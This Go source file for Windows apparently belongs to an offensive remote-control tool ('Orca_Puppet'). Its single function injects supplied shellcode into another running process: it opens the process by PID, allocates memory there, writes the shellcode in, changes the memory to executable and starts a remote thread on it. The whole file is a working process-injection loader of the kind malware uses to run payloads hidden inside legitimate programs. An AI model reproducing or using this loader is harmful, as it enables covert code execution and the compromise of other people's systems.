//go:build windows
// +build windows

package loader

import (
	"Orca_Puppet/define/colorcode"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func RunCreateRemoteThread(shellcode []byte, pid int) string {
	stdErr := ""
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if errOpenProcess != nil {
		message := fmt.Sprintf("Error calling OpenProcess:\r\n%s", errOpenProcess.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		message := fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	return ""
}
